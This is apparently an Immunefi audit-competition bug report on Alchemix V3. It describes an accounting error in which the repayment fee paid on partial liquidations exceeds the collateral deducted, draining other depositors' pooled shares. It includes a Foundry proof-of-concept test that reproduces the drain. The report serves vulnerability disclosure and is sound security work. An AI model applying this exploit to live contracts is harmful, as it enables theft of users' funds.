# 56794 sc critical liquidators can be overpaid due to accounting error&#x20;

**Submitted on Oct 20th 2025 at 18:26:39 UTC by @Cryptor for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56794
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Liquidators can be overpaid due to an accounting error

## Vulnerability Details

The function \_liquidate calls the function \_resolveRepaymentFee which is the reward fee sent to liquidators.

```
 /// @dev Handles repayment fee calculation and account deduction
    /// @param accountId The tokenId of the account to force a repayment on.
    /// @param repaidAmountInYield The amount of debt repaid in yield tokens.
    /// @return fee The fee in yield tokens to be sent to the liquidator.
    function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
        fee = repaidAmountInYield * repaymentFee / BPS;
        account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
        return fee;
    }
```

The function computes a nominal fee based on the repaid amount. It then deducts min(fee, account.collateralBalance) from the victim's collateral balance. However, it proceeds to return the full, potentially larger, nominal fee.

The liquidate function then pays TokenUtils.safeTransfer(myt, msg.sender, feeInYield) using that full returned fee, without clamping to the actually deducted amount.

```
// ...existing code...
        // If debt is fully cleared, return with only the repaid amount, no liquidation needed, caller receives repayment fee
        if (account.debt == 0) {
            feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
            return (repaidAmountInYield, feeInYield, 0);
        }
// ...existing code...
        } else {
            // Since only a repayment happened, send repayment fee to caller
            feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
            return (repaidAmountInYield, feeInYield, 0);
        }
// ...existing code...
```

When a victim's collateral is depleted by a forced repayment (\_forceRepay), their remaining collateralBalance can be less than the calculated fee. In this case, the contract deducts the small remaining balance but pays the full fee, sourcing the difference from the contract's total holdings of MYT shares. This effectively drains collateral from other, healthy users.

This contrasts with the full liquidation path in \_doLiquidation, which correctly checks account.collateralBalance >= feeInYield before paying the base fee, preventing this type of overpayment.

## Impact Details

The vulnerability leads to a direct loss of funds from the contract's pooled collateral as an attacker can repeatedly liquidate eligible accounts and siphon MYT shares from the contract with each transaction.

These MYT shares back other users' deposits. The liquidator receives a fee that is subsidized by all other depositors in the system.

## References

Add any relevant links to documentation or code

## Proof of Concept

## Proof of Concept

Add the following code to src/test/AlchemistV3.t.sol

```
  function testRepaymentFeeOverpaymentDrainsPooledCollateral() external {
        // Ensure protocol fee is zero for a clean accounting surface
        vm.prank(alOwner);
        alchemist.setProtocolFee(0);

        // 1) Healthy account deposits collateral (no debt). These shares will backstop the overpaid fee.
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        uint256 healthyTokenId = AlchemistNFTHelper.getFirstTokenId(yetAnotherExternalUser, address(alchemistNFT));
        vm.stopPrank();

        // 2) Victim deposits a small amount and borrows up to max LTV.
        uint256 victimDeposit = 100e18;
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), victimDeposit);
        alchemist.deposit(victimDeposit, address(0xbeef), 0);
        uint256 victimTokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        // Mint at max
        alchemist.mint(victimTokenId, alchemist.totalValue(victimTokenId) * FIXED_POINT_SCALAR / alchemist.minimumCollateralization(), address(0xbeef));
        vm.stopPrank();

        // 3) Earmark victim's debt fully via a matured redemption.
        (, uint256 victimDebtBefore, ) = alchemist.getCDP(victimTokenId);
        deal(address(alToken), address(0xdad), victimDebtBefore);
        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), victimDebtBefore);
        transmuterLogic.createRedemption(victimDebtBefore);
        vm.stopPrank();
        vm.roll(block.number + 5_256_000); // let earmark fully mature

        // 4) Make repayment in shares unaffordable: drop share price hard so required shares > victim collateral.
        (uint256 victimCollateralBefore,,) = alchemist.getCDP(victimTokenId);
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        uint256 modifiedVaultSupply = (initialVaultSupply * 2) + 1; // ~50% price drop
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        // Sanity: required shares to repay full debt now exceed available shares.
        uint256 requiredShares = alchemist.convertDebtTokensToYield(victimDebtBefore);
        require(requiredShares > victimCollateralBefore, "precondition: required shares should exceed victim collateral");

        // Snapshot contract and healthy account backing before liquidation.
        uint256 contractSharesBefore = IERC20(address(vault)).balanceOf(address(alchemist));
        (uint256 healthyCollateralBefore,,) = alchemist.getCDP(healthyTokenId);

        // 5) Liquidate victim; this will do a repay-only path:
        //    - _forceRepay clamps repayment to all victim shares (sending to transmuter)
        //    - _resolveRepaymentFee returns nominal fee and liquidation pays it out from contract balance.
        vm.startPrank(externalUser);
        (uint256 assetsLiquidated, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(victimTokenId);
        vm.stopPrank();

        // 6) Post state checks.
        // Victim collateral is fully consumed by the forced repayment.
        (uint256 victimCollateralAfter,,) = alchemist.getCDP(victimTokenId);
        assertEq(victimCollateralAfter, 0, "victim collateral should be zero");

        // Repay-only path: no underlying fee, non-zero feeInYield.
        assertEq(feeInUnderlying, 0, "no underlying fee on repay-only");
        require(feeInYield > 0, "repayment fee must be > 0");

        // Liquidated assets are clamped to available victim shares.
        assertEq(assetsLiquidated, victimCollateralBefore, "assets should be clamped to victim shares");

        // Healthy account's recorded collateral stays unchanged...
        (uint256 healthyCollateralAfter,,) = alchemist.getCDP(healthyTokenId);
        assertEq(healthyCollateralAfter, healthyCollateralBefore, "healthy account recorded collateral unchanged");

        // ...but the contract's actual share balance is short by exactly feeInYield,
        // demonstrating the fee was paid out of pooled collateral.
        uint256 contractSharesAfter = IERC20(address(vault)).balanceOf(address(alchemist));
        // Before -> After delta should be assetsLiquidated + feeInYield
        assertEq(
            contractSharesBefore - contractSharesAfter,
            assetsLiquidated + feeInYield,
            "contract share delta should include overpaid fee"
        );
        // And backing shortfall equals feeInYield (healthy account still expects its full shares).
        assertEq(
            healthyCollateralAfter - contractSharesAfter,
            feeInYield,
            "pooled collateral shortfall equals overpaid repayment fee"
        );

        // Liquidator received the repayment fee in vault shares.
        uint256 liquidatorBalance = IERC20(address(vault)).balanceOf(externalUser);
        require(liquidatorBalance >= feeInYield, "liquidator did not receive repayment fee");
    }
```
